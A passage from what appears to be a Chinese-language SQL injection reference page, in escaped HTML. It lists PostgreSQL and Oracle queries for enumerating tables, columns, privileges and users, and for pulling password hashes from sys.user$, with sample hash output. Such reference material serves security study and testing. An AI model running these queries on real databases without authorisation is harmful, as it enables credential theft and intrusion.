class=&#34;token operator&#34;&gt;=&lt;/span&gt;C&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;relnamespace&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attrelid&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;C&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;oid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;atttypid&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;T&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;oid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attnum&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;NOT&lt;/span&gt; A&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attisdropped&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;N&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;nspname &lt;span class=&#34;token operator&#34;&gt;ILIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;public&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;passwd列&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; relname&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attname &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; pg_class C&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;pg_namespace N&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;pg_attribute A&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;pg_type T &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;C&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;relkind&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;N&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;oid&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;C&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;relnamespace&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attrelid&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;C&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;oid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;atttypid&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;T&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;oid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attnum&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;NOT&lt;/span&gt; A&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attisdropped&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;N&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;nspname &lt;span class=&#34;token operator&#34;&gt;ILIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;public&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt;
attname &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%passwd%&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Oracle&#34;&gt;&lt;a href=&#34;#Oracle&#34; class=&#34;headerlink&#34; title=&#34;Oracle&#34;&gt;&lt;/a&gt;Oracle&lt;/h4&gt;&lt;p&gt;无法枚举存在的数据库&lt;/p&gt;
&lt;p&gt;枚举所有属于当前用户的表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; table_name &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; user_tables&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;枚举所有表和表的拥有者&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; owner&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;table_name &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_tables&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;枚举更多关于应用表的信息以确定表中出现的列数和行数&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;table_name&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;[&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;]=&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;num_rows &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; user_tab_columns a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;user_tables b &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;table_name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;table_name &lt;span class=&#34;token keyword&#34;&gt;group&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt;
a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;num_rows

EMP&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;14&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;DUMMY&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
DEPT&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;
SALGRADE&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;为所有可访问或可用的表枚举相同的信息，包括用户、表名以及表中包含的行数&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;owner&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;.&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;table_name&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;[&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;]=&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;num_rows &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_tab_columns a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;all_tables b &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;table_name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;table_name &lt;span class=&#34;token keyword&#34;&gt;group&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;owner&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;num_rows&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;枚举每张表的列和数据类型以便更完整地了解数据库模式&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; table_name&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;:&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;column_name&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;:&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;data_type&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;:&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;column_id &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; user_tab_columns &lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; table_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;column_id

DEPT:DEPTNO:NUMBER:&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
DEPT:DNAME:VARCHAR2:&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;
DEPT:LOC:VARCHAR2:&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;DUMMY&lt;/span&gt;:&lt;span class=&#34;token keyword&#34;&gt;DUMMY&lt;/span&gt;:NUMBER:&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
EMP:EMPNO:NUMBER:&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
EMP:ENAME:VARCHAR2:&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;
EMP:JOB:VARCHAR2:&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;
EMP:MGR:NUMBER:&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;
EMP:HIREDATE:&lt;span class=&#34;token keyword&#34;&gt;DATE&lt;/span&gt;:&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;
EMP:SAL:NUMBER:&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;
EMP:COMM:NUMBER:&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;
EMP:DEPTNO:NUMBER:&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;
SALGRADE:GRADE:NUMBER:&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
SALGRADE:LOSAL:NUMBER:&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;
SALGRADE:HISAL:NUMBER:&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;返回当前数据库用户权限&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- 获取当前用户的系统权限：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; user_sys_privs&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- how system privileges of the current user&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 获取当前用户的角色权限：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; user_role_privs&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- show role privileges of the current user&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 获取当前用户的表格权限：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; user_tab_privs&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 获取当前用户的列权限：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; user_col_privs&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;获取所有可能的权限列表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- 获取所有系统权限：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_sys_privs&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 获取所有角色权限：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_role_privs&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 获取所有表权限：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_tab_privs&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 获取所有列权限：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_col_privs&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;返回数据库中所有用户的列表，默认任意数据库用户可执行&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;created &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_users &lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; created &lt;span class=&#34;token keyword&#34;&gt;desc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

SCOTT	&lt;span class=&#34;token number&#34;&gt;04&lt;/span&gt;	&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;JAN &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;	&lt;span class=&#34;token number&#34;&gt;09&lt;/span&gt;
PHP	&lt;span class=&#34;token number&#34;&gt;04&lt;/span&gt;	&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;JAN &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;	&lt;span class=&#34;token number&#34;&gt;09&lt;/span&gt;
PLSQL	&lt;span class=&#34;token number&#34;&gt;02&lt;/span&gt;	&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;JAN &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;	&lt;span class=&#34;token number&#34;&gt;09&lt;/span&gt;
MONODEMO	&lt;span class=&#34;token number&#34;&gt;29&lt;/span&gt;	&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;DEC&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;	&lt;span class=&#34;token number&#34;&gt;08&lt;/span&gt;
DEMO1	&lt;span class=&#34;token number&#34;&gt;29&lt;/span&gt;	&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;DEC&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;	&lt;span class=&#34;token number&#34;&gt;08&lt;/span&gt;
ALEX	&lt;span class=&#34;token number&#34;&gt;14&lt;/span&gt;	&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;DEC&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;	&lt;span class=&#34;token number&#34;&gt;08&lt;/span&gt;
OWBSYS	&lt;span class=&#34;token number&#34;&gt;13&lt;/span&gt;	&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;DEC&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;	&lt;span class=&#34;token number&#34;&gt;08&lt;/span&gt;
FLOWS_030000	&lt;span class=&#34;token number&#34;&gt;13&lt;/span&gt;	&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;DEC&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;	&lt;span class=&#34;token number&#34;&gt;08&lt;/span&gt;
APEX &lt;span class=&#34;token keyword&#34;&gt;PUBLIC&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;USER&lt;/span&gt;	&lt;span class=&#34;token number&#34;&gt;13&lt;/span&gt;	&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;DEC&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;	&lt;span class=&#34;token number&#34;&gt;08&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在Oracle 10g R2之后的版本中，普通用户可使用下列SELECT语句检索数据库的用户名和哈希口令&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; astatus &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;$ &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&amp;gt;0 and length(password)=16 &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- astatus (0=open, 9=locked&amp;amp; expired)&lt;/span&gt;

SYS     AD24A888FC3B1BE7 &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
SYSTEM  BD3D49AD69E3FA34 &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
OUTLN   &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;A3BA55E08595081 &lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oracle llg中，Oracle已经修改了所使用口令的哈希算法，而且哈希口令位于另外 一个不同的列中（spare4列），如下所示：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;spare4 &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;$ &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&amp;gt;0 and length(spare4)=62 &lt;/span&gt;

SYS
S:&lt;span class=&#34;token number&#34;&gt;1336&lt;/span&gt;FB26ACF58354164952E502B4F726FF8B5D382012D2E7B1EC99C426A7
SYSTEM
